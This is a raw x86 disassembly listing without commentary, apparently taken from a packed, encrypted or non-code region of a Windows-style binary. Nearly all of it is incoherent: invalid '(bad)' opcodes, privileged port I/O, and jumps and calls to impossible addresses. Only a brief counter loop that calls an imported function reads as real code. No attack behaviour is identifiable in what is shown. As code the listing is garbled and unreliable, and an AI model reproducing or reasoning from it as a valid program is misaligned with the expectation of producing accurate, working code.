  4110c7:	neg    DWORD PTR [edx+0x1c]
  4110ca:	sbb    DWORD PTR [ebx-0xa],edx
  4110cd:	inc    edx
  4110ce:	int3   
  4110cf:	mov    al,0x8
  4110d1:	mov    edi,0xd1274d69
  4110d6:	ja     0x411102
  4110d8:	sub    ebp,DWORD PTR [ebx+ecx*4-0x60cedcbe]
  4110df:	cmp    ebx,eax
  4110e1:	in     al,dx
  4110e2:	not    BYTE PTR [eax-0x704a3af5]
  4110e8:	inc    eax
  4110e9:	pop    ds
  4110ea:	xor    ebp,DWORD PTR [ebp-0x32]
  4110ed:	test   eax,0xc0121bf4
  4110f2:	jmp    0xc709a796
  4110f7:	cmp    BYTE PTR [eax+0x6],bh
  4110fa:	mov    esi,0x46b6915e
  4110ff:	std    
  411100:	shl    BYTE PTR [edi],cl
  411102:	push   ecx
  411103:	fwait
  411104:	test   BYTE PTR [edi-0x140c50ba],0xd6
  41110b:	xchg   ecx,eax
  41110c:	retf   0xd0c5
  41110f:	fwait
  411110:	dec    ebp
  411111:	adc    eax,0x562f4d02
  411116:	mov    esp,0x86c37503
  41111b:	or     eax,0x215708b8
  411120:	or     esi,DWORD PTR [esi+0x71]
  411123:	and    ebp,ebp
  411125:	pushf  
  411126:	mov    ebp,0x83469d2a
  41112b:	adc    eax,0xdf6e0155
  411130:	fmul   DWORD PTR [eax-0x5572b11b]
  411136:	sbb    eax,0x1b74b7f
  41113b:	xchg   esp,eax
  41113c:	push   es
  41113d:	icebp  
  41113e:	mov    ebp,0x18c6f95e
  411143:	dec    esp
  411144:	push   0xffffffe0
  411146:	push   edi
  411147:	scas   eax,DWORD PTR es:[edi]
  411148:	aaa    
  411149:	ror    BYTE PTR [ebx-0x4c51fa35],1
  41114f:	(bad)  
  411150:	mov    al,ds:0x44911a5b
  411155:	jl     0x411104
  411157:	pop    ebx
  411158:	inc    ebp
  411159:	lods   eax,DWORD PTR ds:[esi]
  41115a:	mov    BYTE PTR [ecx],bl
  41115c:	(bad)  
  41115d:	pop    ebx
  41115e:	or     eax,0xe9a2a36
  411163:	mov    ?,WORD PTR [ebx]
  411165:	stos   DWORD PTR es:[edi],eax
  411166:	mov    dl,0xd2
  411168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411169:	xchg   edx,eax
  41116a:	es sti 
  41116c:	test   al,0x76
  41116e:	push   eax
  41116f:	mov    bh,0x81
  411171:	in     eax,dx
  411172:	int    0x94
  411174:	pushf  
  411175:	mov    edi,DWORD PTR [edi]
  411177:	cmp    al,0x8a
  411179:	mov    ebx,0xbdad87d5
  41117e:	sub    al,0x1a
  411180:	jnp    0x411149
  411182:	(bad)  
  411183:	out    dx,al
  411184:	out    dx,eax
  411185:	inc    esi
  411186:	adc    DWORD PTR [esi],0xffffffc0
  411189:	stos   BYTE PTR es:[edi],al
  41118a:	gs jl  0x41120c
  41118d:	and    al,BYTE PTR [ebp-0x50370657]
  411193:	mov    bl,0xa5
  411195:	pop    esp
  411196:	out    dx,eax
  411197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411198:	in     eax,0x59
  41119a:	mov    esi,0xfbda8c2f
  41119f:	mov    edx,ss
  4111a1:	or     dh,ah
  4111a3:	mov    eax,0x6b5c6e5b
  4111a8:	(bad)  
  4111a9:	or     bl,al
  4111ab:	mov    edx,DWORD PTR [eax-0x2e]
  4111ae:	jo     0x4111fa
  4111b0:	gs jo  0x4111c0
  4111b3:	cld    
  4111b4:	rcr    DWORD PTR [edx-0x69],0x91
  4111b8:	jns    0x411215
  4111ba:	add    al,0xa2
  4111bc:	cld    
  4111bd:	je     0x411156
  4111bf:	add    dh,BYTE PTR [bx+di+0x5a92]
  4111c4:	call   0x8a0a86ac
  4111c9:	clc    
  4111ca:	fwait
  4111cb:	nop
  4111cc:	out    dx,al
  4111cd:	mov    ah,0x87
  4111cf:	xor    BYTE PTR [ecx-0x44],bl
  4111d2:	mov    ss,WORD PTR [bx+si]
  4111d5:	daa    
  4111d6:	push   ss
  4111d7:	mov    BYTE PTR [ebx+0x4c],ch
  4111da:	add    al,0x7f
  4111dc:	into   
  4111dd:	sub    ah,BYTE PTR [esi]
  4111df:	aad    0x1c
  4111e1:	aam    0x5b
  4111e3:	or     al,0x33
  4111e5:	fdivr  QWORD PTR [esi-0x15]
  4111e8:	popf   
  4111e9:	dec    edx
  4111ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111eb:	add    eax,0x9a082383
  4111f0:	and    al,0x49
  4111f2:	and    al,0x10
  4111f4:	pop    esi
  4111f5:	push   eax
  4111f6:	daa    
  4111f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111f8:	imul   cl
  4111fa:	jae    0x411213
  4111fc:	and    al,0x78
  4111fe:	adc    al,0xba
  411200:	xor    BYTE PTR [edi],ah
  411202:	xchg   edi,eax
  411203:	out    0x3e,al
  411205:	icebp  
  411206:	outs   dx,DWORD PTR ds:[esi]
  411207:	hlt    
  411208:	mov    WORD PTR [ebp+0x1789145a],gs
  41120e:	push   edi
  41120f:	fldpi  
  411211:	or     DWORD PTR cs:[edi-0x404329e4],0xf
  411219:	lods   eax,DWORD PTR ds:[esi]
  41121a:	call   0x75ee7c4d
  41121f:	mov    BYTE PTR ds:0x9849d60b,cl
  411225:	pop    edx
  411226:	add    al,0x3b
  411228:	aas    
  411229:	popf   
  41122a:	jo     0x41121c
  41122c:	push   ebp
  41122d:	push   ebx
  41122e:	rol    BYTE PTR [esi-0x4e],0xf8
  411232:	jns    0x41125d
  411234:	int    0x14
  411236:	jecxz  0x4111c2
  411238:	mov    dl,BYTE PTR [edi+0x20]
  41123b:	xor    DWORD PTR [ecx],ebp
  41123d:	add    bl,BYTE PTR [edi-0x7a]
  411240:	xchg   esi,eax
  411241:	dec    esi
  411242:	std    
  411243:	test   eax,0x3a530787
  411248:	push   0x41
  41124a:	jmp    0x4112b8
  41124c:	repnz adc eax,0xa3930b92
  411252:	cli    
  411253:	mov    cl,0xa4
  411255:	jno    0x411210
  411257:	lods   eax,DWORD PTR ds:[esi]
  411258:	mov    cl,0x77
  41125a:	add    BYTE PTR [edi+eiz*2+0x220c892f],dh
  411261:	adc    dh,ch
  411263:	fisubr WORD PTR [ebp-0x54]
  411266:	mov    dh,0x74
  411268:	sahf   
  411269:	push   edi
  41126a:	shl    BYTE PTR [ebp-0x35d8d0ce],0xa5
  411271:	in     eax,dx
  411272:	stc    
  411273:	ins    BYTE PTR es:[edi],dx
  411274:	outs   dx,DWORD PTR ds:[esi]
  411275:	inc    esi
  411276:	sub    BYTE PTR ss:[ebx],cl
  411279:	pusha  
  41127a:	pop    es
  41127b:	push   cs
  41127c:	shl    BYTE PTR [eax-0x242440f5],cl
  411282:	and    ah,BYTE PTR [edx+0x63]
  411285:	lods   eax,DWORD PTR ds:[esi]
  411286:	js     0x411287
  411288:	test   edi,eax
  41128a:	mov    bl,BYTE PTR [esi+0x6b]
  41128d:	sub    ebx,DWORD PTR [ebx-0x3a]
  411290:	and    BYTE PTR [eax-0x71],ch
  411293:	push   esi
  411294:	out    dx,eax
  411295:	jno    0x4112fb
  411297:	push   ds
  411298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41129a:	fld    QWORD PTR [eax+0x6b5925fe]
  4112a0:	sbb    dh,BYTE PTR [edi+0x42fb5e16]
  4112a6:	fstp   TBYTE PTR [esi+esi*4]
  4112a9:	dec    eax
  4112aa:	enter  0xf728,0x20
  4112ae:	mov    dl,0x2
  4112b0:	repz inc esi
  4112b2:	lds    esp,FWORD PTR [ecx+0x2012c300]
  4112b8:	and    DWORD PTR [ebp-0x717d8ee1],esi
  4112be:	mov    edi,0x228d7822
  4112c3:	rcl    BYTE PTR [ebx-0x5],cl
  4112c6:	lds    ebp,FWORD PTR [esi-0x28]
  4112c9:	jg     0x4112e7
  4112cb:	jmp    0x411306
  4112cd:	outs   dx,BYTE PTR ds:[esi]
  4112ce:	hlt    
  4112cf:	xchg   edx,eax
  4112d0:	jmp    0xa051:0x5cca
  4112d6:	push   ss
  4112d7:	ds mov esp,0xa4f63e1f
  4112dd:	add    ebx,esi
  4112df:	les    ebp,FWORD PTR [edx]
  4112e1:	pushf  
  4112e2:	loope  0x41130d
  4112e4:	call   0x9388:0xe103cbae
  4112eb:	aas    
  4112ec:	jl     0x4112da
  4112ee:	adc    ebp,DWORD PTR [ebp-0x36]
  4112f1:	jmp    0x411290
  4112f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112f4:	fld    QWORD PTR [edi]
  4112f6:	xchg   ebp,eax
  4112f7:	ret    
  4112f8:	call   0xea4f:0x4ddf16d7
  4112ff:	xchg   ebp,eax
  411300:	jno    0x4112c9
  411302:	sub    esp,esi
  411304:	neg    DWORD PTR [ecx-0x23]
  411307:	sub    BYTE PTR [ebx+0x79],bl
  41130a:	pop    ebx
  41130b:	retf   0x2df3
  41130e:	stc    
  41130f:	inc    esi
  411310:	xor    ebx,DWORD PTR [esp+ebx*8+0x4ee53f3c]
  411317:	std    
  411318:	jb     0x4112f9
  41131a:	push   ss
  41131b:	inc    ebp
  41131c:	inc    esp
  41131d:	or     eax,0x1828dc23
  411322:	xchg   esp,eax
  411323:	mov    esp,0xaa35fb82
  411328:	aad    0x2d
  41132a:	sti    
  41132b:	out    dx,eax
  41132c:	adc    DWORD PTR [eax],ebp
  41132e:	jge    0x4113a5
  411330:	cmp    al,0xd3
  411332:	dec    ecx
  411333:	mov    ds:0x93642da3,al
  411339:	imul   eax,DWORD PTR [eax],0xffffffd7
  41133c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41133d:	scas   al,BYTE PTR es:[edi]
  41133e:	sbb    esi,DWORD PTR [ebp+0x3c306d00]
  411344:	and    eax,0xfa2c3b5a
  411349:	sub    DWORD PTR ss:[ebp-0x6d],ebx
  41134d:	rol    DWORD PTR [ebx+0x837ad1c],1
  411353:	add    eax,DWORD PTR [eax]
  411355:	std    
  411356:	cli    
  411357:	sub    al,BYTE PTR [ecx+eax*4]
  41135a:	out    0xd2,eax
  41135c:	pop    eax
  41135d:	ja     0x411306
  41135f:	pushf  
  411360:	or     DWORD PTR [ecx+0x2d],ebp
  411363:	js     0x411388
  411365:	out    dx,eax
  411366:	mov    eax,ds:0x24dee369
  41136b:	les    eax,FWORD PTR [edi+0x4d]
  41136e:	mov    dh,0xaf
  411370:	push   edx
  411371:	cmp    DWORD PTR [ecx-0x14],esi
  411374:	int    0x35
  411376:	push   ds
  411377:	aaa    
  411378:	(bad)  [ecx+eax*8-0x6c]
  41137c:	mov    al,ds:0x8e73d046
  411381:	push   ebp
  411382:	mov    dh,0xdd
  411384:	jae    0x411317
  411386:	call   0x37e7:0x7de96d5
  41138d:	mov    BYTE PTR [edi],al
  41138f:	inc    eax
  411390:	inc    DWORD PTR [ebp+0x62]
  411393:	test   DWORD PTR [ecx+ebp*2],ecx
  411396:	pop    es
  411397:	xchg   ebp,eax
  411398:	cmp    al,0xc
  41139a:	or     edx,esp
  41139c:	xlat   BYTE PTR ds:[ebx]
  41139d:	mov    dh,0x3a
  41139f:	pop    eax
  4113a0:	mov    eax,ds:0x1836ed1d
  4113a5:	and    eax,0xf1cb7c63
  4113aa:	xor    bl,BYTE PTR [ebx+0x11b5499e]
  4113b0:	xchg   ebx,eax
  4113b1:	cli    
  4113b2:	cmp    ah,cl
  4113b4:	mov    ch,BYTE PTR [edx]
  4113b6:	cmp    edx,DWORD PTR [ebx]
  4113b8:	pop    DWORD PTR [edx+0xb096dfd]
  4113be:	ja     0x411381
  4113c0:	mov    bh,al
  4113c2:	cmp    ah,0x3b
  4113c5:	mov    bh,0x5
  4113c8:	icebp  
  4113c9:	cld    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411448:	jge    0x41146a
  41144a:	test   BYTE PTR [esi],0x4a
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4113ec
  411454:	xlat   BYTE PTR ds:[ebx]
  411455:	loop   0x41141a
  411457:	adc    BYTE PTR [edx-0x29],0x40
  41145b:	cdq    
  41145c:	pop    edx
  41145d:	cli    
  41145e:	and    cl,dl
  411460:	xor    dl,ah
  411462:	add    DWORD PTR [esi+0xc0a472e],0x52
  411469:	div    BYTE PTR [ebx-0x73dfc72]
  41146f:	mov    edi,0x71b58051
  411474:	lea    eax,[edx-0x1a]
  411477:	nop
  411478:	sub    al,0x9c
  41147a:	push   esp
  41147b:	out    dx,al
  41147c:	leave  
  41147d:	fst    DWORD PTR [edi-0x14]
  411480:	push   0xffffffaf
  411482:	ins    BYTE PTR es:[edi],dx
  411483:	scas   eax,DWORD PTR es:[edi]
  411484:	add    al,BYTE PTR [edx]
  411486:	jo     0x411455
  411488:	jecxz  0x41147d
  41148a:	repnz xchg edi,eax
  41148c:	sbb    edx,DWORD PTR [esi-0x7fa25327]
  411492:	pop    esp
  411493:	div    DWORD PTR [ebp-0x34]
  411496:	push   ecx
  411497:	adc    eax,DWORD PTR [ebx-0x5b]
  41149a:	sti    
  41149b:	or     al,0xbc
  41149d:	mov    cl,0xe4
  41149f:	call   0x933975df
  4114a4:	inc    eax
  4114a5:	push   ebx
  4114a6:	push   ds
  4114a7:	mov    esp,0x312652e7
  4114ac:	rcl    BYTE PTR [ebx+eax*1+0x1a],1
  4114b0:	xlat   BYTE PTR ds:[ebx]
  4114b1:	xor    BYTE PTR [ecx+eax*4],ah
  4114b4:	mov    ah,0xaf
  4114b6:	inc    ebx
  4114b7:	rol    DWORD PTR [edi-0x667a5778],0xd7
  4114be:	and    DWORD PTR [ebx-0x1b23a5fe],edi
  4114c4:	mov    esi,0x4a5a0bf0
  4114c9:	pop    edx
  4114ca:	dec    ebp
  4114cb:	push   ecx
  4114cc:	jb     0x4114b8
  4114ce:	xor    ebx,ebp
  4114d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d1:	cwde   
  4114d2:	dec    edi
  4114d3:	mov    BYTE PTR [edx+0x173debf6],bl
  4114d9:	(bad)  
  4114da:	lock jmp 0x5670:0x125e5c48
  4114e2:	cmp    eax,0x331f8ba3
  4114e7:	mov    cl,0xec
  4114e9:	mov    edi,?
  4114eb:	add    eax,0xb414763d
  4114f0:	xor    eax,0x5ed46b59
  4114f5:	dec    ebx
  4114f6:	ja     0x4114ca
  4114f8:	jmp    0xf74b:0x29e4441
  4114ff:	hlt    
  411500:	gs dec ecx
  411502:	daa    
  411503:	mov    ch,0xd
  411505:	xchg   ebx,eax
  411506:	push   ecx
  411507:	rcr    BYTE PTR [ecx],1
  411509:	gs sub al,0xf1
  41150c:	std    
  41150d:	daa    
  41150e:	cld    
  41150f:	data16 fs int3 
  411512:	mov    ds:0x35c89363,al
  411517:	push   ds
  411518:	repnz dec ebp
  41151a:	fstp   TBYTE PTR [edi+0x54]
  41151d:	sub    eax,DWORD PTR [ebx+ebx*4+0x7d]
  411521:	mov    bh,cl
  411523:	pop    esi
  411524:	and    DWORD PTR [ecx],0xa77ddd2b
  41152a:	push   cs
  41152b:	addr16 mov ch,0x78
  41152e:	icebp  
  41152f:	sbb    edi,eax
  411531:	popf   
  411532:	push   edi
  411533:	dec    eax
  411534:	adc    dl,BYTE PTR [esp+ebx*1+0x45]
  411538:	loopne 0x4114e4
  41153a:	(bad)  
  41153b:	ss pop edi
  41153d:	ins    DWORD PTR es:[edi],dx
  41153e:	pop    ecx
  41153f:	sub    al,0xc9
  411541:	pop    esi
  411542:	xchg   dh,cl
  411544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411545:	rdmsr  
  411547:	cmp    eax,0x636f21c8
  41154c:	sub    ch,bh
  41154e:	mov    al,0xf9
  411550:	daa    
  411551:	mov    al,ds:0x3b9a7ccc
  411556:	ror    esi,cl
  411558:	mov    bl,0xdc
  41155a:	fidivr DWORD PTR [edi-0x2d]
  41155d:	fucom  st(5)
  41155f:	or     eax,0xd639ec06
  411564:	scas   al,BYTE PTR es:[edi]
  411565:	pop    edx
  411566:	sub    BYTE PTR [edi],dl
  411568:	cmp    esp,edi
  41156a:	push   ecx
  41156b:	out    dx,eax
  41156c:	mov    esi,0x2475cf85
  411571:	mov    ds:0xc6da417,eax
  411576:	pusha  
  411577:	inc    DWORD PTR [edx+0x456740fc]
  41157d:	cdq    
  41157e:	mov    eax,0x46461e4f
  411583:	jecxz  0x4115cd
  411585:	mov    ecx,0x832611fd
  41158a:	pop    esi
  41158b:	scas   al,BYTE PTR es:[edi]
  41158c:	jecxz  0x4115c3
  41158e:	jg     0x41157e
  411590:	daa    
  411591:	sub    cl,BYTE PTR [ecx-0x19]
  411594:	add    ebp,esi
  411596:	push   esp
  411597:	sub    al,0x97
  411599:	mov    dh,0x95
  41159b:	int3   
  41159c:	mov    ebp,DWORD PTR [edx+0x48]
  41159f:	je     0x41159d
  4115a1:	mov    ebx,0xbcf9ab9d
  4115a6:	jb     0x411551
  4115a8:	mov    dl,0xb4
  4115aa:	push   0xffffffe8
  4115ac:	outs   dx,DWORD PTR ds:[esi]
  4115ad:	add    bh,BYTE PTR [eax+0x664fa01e]
  4115b3:	push   ebx
  4115b4:	pop    edi
  4115b5:	shl    BYTE PTR ds:0x45935829,0x3
  4115bc:	aas    
  4115bd:	icebp  
  4115be:	leave  
  4115bf:	mov    BYTE PTR [edi+0x22],ah
  4115c2:	int3   
  4115c3:	in     al,0x3d
  4115c5:	cld    
  4115c6:	mov    al,ds:0x9d6b946
  4115cb:	stos   BYTE PTR es:[edi],al
  4115cc:	mov    DWORD PTR [ecx+0x70f0a33c],eax
  4115d2:	xor    BYTE PTR [ecx-0x6c48326b],dh
  4115d8:	into   
  4115d9:	cld    
  4115da:	test   BYTE PTR [edi+0x4c096b69],ah
  4115e0:	data16 jno 0x4115c6
  4115e3:	jae    0x411568
  4115e5:	sar    DWORD PTR [ebx],cl
  4115e7:	jge    0x41163a
  4115e9:	jg     0x4115b8
  4115eb:	add    eax,0xa58d3c00
  4115f0:	sbb    ebx,DWORD PTR [edx-0x726374f8]
  4115f6:	ret    
  4115f7:	out    0xf4,eax
  4115f9:	arpl   WORD PTR [eax+0x142cb768],cx
  4115ff:	es push 0x173480c5
  411605:	xor    BYTE PTR [esi+0x4b],bh
  411608:	adc    edi,DWORD PTR [edx-0xa]
  41160b:	ds inc edx
  41160d:	jnp    0x411613
  41160f:	ret    
  411610:	xor    al,0xe0
  411612:	push   ebp
  411613:	neg    DWORD PTR [edx]
  411615:	pop    es
  411616:	shl    DWORD PTR gs:[edi-0x7c],cl
  41161a:	dec    ecx
  41161b:	sub    bl,BYTE PTR [eax-0x2]
  41161e:	mov    eax,ecx
  411620:	mov    ah,BYTE PTR [eax+0x56e87192]
  411626:	inc    ebx
  411627:	shl    DWORD PTR [eax-0x7d48febd],0x3e
  41162e:	mov    edi,0xd2ffa7e4
  411633:	and    edx,DWORD PTR [ecx-0x2a32bbde]
  411639:	cmp    al,0x79
  41163b:	std    
  41163c:	in     al,0xe0
  41163e:	mov    dl,0xa
  411640:	cmp    ax,0xb1d2
  411644:	sub    edx,DWORD PTR [ecx+0x5e]
  411647:	dec    ebx
  411648:	mov    edx,0x8d0e5f5f
  41164d:	loopne 0x411623
  41164f:	stos   DWORD PTR es:[edi],eax
  411650:	lods   al,BYTE PTR ds:[esi]
  411651:	sub    edi,eax
  411653:	cmp    DWORD PTR [ebp+0x1d6ab5c0],0xc94b5f67
  41165d:	sbb    eax,0xcd086334
  411662:	ror    BYTE PTR [ecx],cl
  411664:	test   eax,0x11e88e90
  411669:	in     eax,0x4d
  41166b:	adc    dl,BYTE PTR [esi+0x47]
  41166e:	shr    DWORD PTR [edi],0x16
  411671:	pushw  es
  411673:	retf   0x62f2
  411676:	aam    0x45
  411678:	cmp    BYTE PTR [esi-0x73c978c8],dl
  41167e:	add    al,0x27
  411680:	dec    esi
  411681:	pop    ecx
  411682:	xor    al,0x47
  411684:	or     BYTE PTR [ebp-0x1b],0x4b
  411688:	xchg   esp,eax
  411689:	fsub   DWORD PTR [eax]
  41168b:	or     BYTE PTR [ebx-0x21],0xd9
  41168f:	test   esp,edi
  411691:	inc    ebx
  411692:	fsubrp st(5),st
  411694:	xchg   esp,eax
  411695:	and    bl,ah
  411697:	lods   eax,DWORD PTR ds:[esi]
  411698:	int3   
  411699:	fsubr  QWORD PTR [ebx]
  41169b:	and    BYTE PTR [edi],0x4f
  41169e:	fldcw  WORD PTR [esi+0x76]
  4116a1:	mov    edx,DWORD PTR [edx+0x786fd76]
  4116a7:	sbb    WORD PTR [ebp+0x1cda8ed],di
  4116ae:	repz xor BYTE PTR [ecx],cl
  4116b1:	aad    0x69
  4116b3:	das    
  4116b4:	ins    DWORD PTR es:[edi],dx
  4116b5:	pop    edx
  4116b6:	out    0xa8,al
  4116b8:	pop    es
  4116b9:	mov    ds:0x2a71eeeb,al
  4116be:	push   ebp
  4116bf:	pop    ebp
  4116c0:	mov    eax,0x2d0e9357
  4116c5:	push   ecx
  4116c6:	cmp    BYTE PTR [edx],bh
  4116c8:	std    
  4116c9:	push   ds
  4116ca:	inc    ecx
  4116cb:	rcr    BYTE PTR [ebx],1
  4116cd:	mov    ds,ebx
  4116cf:	cmp    al,0x41
  4116d1:	adc    al,0x36
  4116d3:	repnz mul ah
  4116d6:	lock call 0x208b:0x2801eeba
  4116de:	sbb    DWORD PTR [esi],edx
  4116e0:	ja     0x411676
  4116e2:	jl     0x411683
  4116e4:	sbb    eax,0x1c847abc
  4116e9:	adc    DWORD PTR [edi+0x7e],0xe70ceafd
  4116f0:	sub    cl,dl
  4116f2:	and    al,0xc8
  4116f4:	fst    st(4)
  4116f6:	sub    DWORD PTR [esi+eax*1],ebp
  4116f9:	loop   0x4116e0
  4116fb:	pop    ebx
  4116fc:	iret   
  4116fd:	pop    ss
  4116fe:	lods   al,BYTE PTR ds:[esi]
  4116ff:	jnp    0x41172d
  411701:	sbb    BYTE PTR [ebx+0x51f46f7e],dh
  411707:	mov    al,ds:0x6e236cff
  41170c:	ret    
  41170d:	test   DWORD PTR [esp+edi*8],eax
  411710:	and    dl,BYTE PTR [ebp+ebx*8+0x27428c60]
  411717:	cmp    al,0xa5
  411719:	xor    al,BYTE PTR [edi-0x6d1d775f]
  41171f:	push   esi
  411720:	inc    esi
  411721:	aam    0xf2
  411723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411724:	inc    edx
  411725:	jmp    0xb96e642
  41172a:	dec    edx
  41172b:	push   edx
  41172c:	scas   al,BYTE PTR es:[edi]
  41172d:	cld    
  41172e:	xor    BYTE PTR [edi-0x78],dh
  411731:	xor    BYTE PTR [eax-0x16f97f2],bh
  411737:	aam    0x4e
  411739:	(bad)  
  41173a:	sahf   
  41173b:	mov    WORD PTR [ebx+0x14],gs
  41173e:	push   0x15e283d8
  411743:	mov    ds,WORD PTR [ebx]
  411745:	pop    edx
  411746:	lods   al,BYTE PTR ds:[esi]
  411747:	and    dl,BYTE PTR [ebx]
  411749:	jge    0x41170a
  41174b:	std    
  41174c:	das    
  41174d:	pop    ecx
  41174e:	pop    ss
  41174f:	add    DWORD PTR [ecx-0x59e96ae3],ecx
  411755:	pushf  
  411756:	into   
  411757:	pop    edx
  411758:	jmp    0x7b8a:0xce9bc6c5
  41175f:	dec    edx
  411760:	daa    
  411761:	imul   DWORD PTR [edx]
  411763:	sub    dl,BYTE PTR [esi-0x5ef857bc]
  411769:	outs   dx,BYTE PTR ds:[esi]
  41176a:	pop    edi
  41176b:	(bad)
  41176e:	xchg   BYTE PTR [esi-0x9],ch
  411771:	mov    eax,ds:0xfbc35617
  411776:	retf   
  411777:	dec    edx
  411778:	mov    WORD PTR [edi-0x24a5ab6b],ss
  41177e:	loopne 0x41179b
  411780:	popf   
  411781:	sahf   
  411782:	dec    esp
  411783:	lahf   
  411784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411785:	adc    DWORD PTR [ecx+0x58],0x60b6c502
  41178c:	popa   
  41178d:	icebp  
  41178e:	push   0xc577caa0
  411793:	xchg   dh,ah
  411795:	and    al,0x5d
  411797:	pop    esi
  411798:	sahf   
  411799:	jl     0x4117f6
  41179b:	loop   0x4117a1
  41179d:	and    eax,0x2f2db9bd
  4117a2:	shr    DWORD PTR [ebp-0x30a723f],1
  4117a8:	popa   
  4117a9:	and    bl,BYTE PTR [ecx+0x56c50262]
  4117af:	xchg   esi,eax
  4117b0:	push   edi
  4117b1:	adc    al,0x35
  4117b3:	mov    al,0x6c
  4117b5:	les    edx,FWORD PTR [ebx-0x8855bc4]
  4117bb:	add    BYTE PTR [edx-0x75],bl
  4117be:	xor    DWORD PTR [ecx+0x16facf10],eax
  4117c4:	add    eax,0x130f6972
  4117c9:	jmp    0x5b78:0xf363a773
  4117d0:	jno    0x41175e
  4117d2:	pop    esp
  4117d3:	scas   eax,DWORD PTR es:[edi]
  4117d4:	test   bh,0x29
  4117d7:	dec    ebx
  4117d8:	(bad)  
  4117d9:	or     eax,0x1bd423fb
  4117de:	lahf   
  4117df:	jmp    0x3278:0x30cf293b
  4117e6:	daa    
  4117e7:	push   ds
  4117e8:	jmp    0xea87:0x694ab486
  4117ef:	std    
  4117f0:	push   ds
  4117f1:	outs   dx,DWORD PTR ds:[esi]
  4117f2:	jae    0x4117b2
  4117f4:	in     eax,dx
  4117f5:	addr16 dec esi
  4117f7:	out    0x4,al
  4117f9:	jbe    0x411846
  4117fb:	sbb    eax,0xa8a997af
  411800:	mov    esp,0x98ec8fd
  411805:	clc    
  411806:	mov    ds:0xb66f46d3,al
  41180b:	in     eax,0xf7
  41180d:	dec    ecx
  41180e:	dec    esp
  41180f:	mov    ch,0xe6
  411811:	push   ebp
  411812:	stos   DWORD PTR es:[edi],eax
  411813:	mov    al,ds:0x7e01513
  411818:	in     al,0x5f
  41181a:	in     eax,0xb9
  41181c:	jmp    0xf486:0xe501c777
  411823:	xchg   edx,eax
  411824:	cmp    esi,DWORD PTR [edi]
  411826:	jae    0x4117a9
  411828:	push   edi
  411829:	xchg   ebx,eax
  41182a:	in     eax,0x5f
  41182c:	inc    esi
  41182d:	dec    bh
  41182f:	dec    esp
  411830:	js     0x411871
  411832:	cmp    ah,dl
  411834:	stos   DWORD PTR es:[edi],eax
  411835:	and    ecx,ecx
  411837:	adc    DWORD PTR [edx],esp
  411839:	adc    eax,0xc758ba1
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x34cb4be9],dl
  41187c:	add    DWORD PTR [esi+0x57],esi
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411859
  411886:	push   edi
  411887:	test   BYTE PTR [edi],cl
  411889:	daa    
  41188a:	xchg   edx,eax
  41188b:	push   cs
  41188c:	retf   0x92dd
  41188f:	dec    ebx
  411890:	(bad)
  411893:	fimul  WORD PTR [ebx]
  411895:	scas   al,BYTE PTR es:[edi]
  411896:	jecxz  0x41186d
  411898:	cmc    
  411899:	jne    0x4118d8
  41189b:	fwait
  41189c:	push   edi
  41189d:	pop    es
  41189e:	icebp  
  41189f:	(bad)
  4118a3:	ins    DWORD PTR es:[edi],dx
  4118a4:	or     eax,0x37645d52
  4118a9:	mov    ch,0xe2
  4118ab:	icebp  
  4118ac:	push   esi
  4118ad:	mov    DWORD PTR [ebp+0x630d1721],ebp
  4118b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118b4:	test   BYTE PTR [ecx],cl
  4118b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118b7:	loopne 0x4118bd
  4118b9:	stc    
  4118ba:	(bad)  
  4118bb:	sti    
  4118bc:	mov    eax,ds:0x361ebbbe
  4118c1:	icebp  
  4118c2:	lods   eax,DWORD PTR ds:[esi]
  4118c3:	dec    eax
  4118c4:	shr    BYTE PTR [ecx+0x1f],0x62
  4118c8:	aas    
  4118c9:	and    al,0x6e
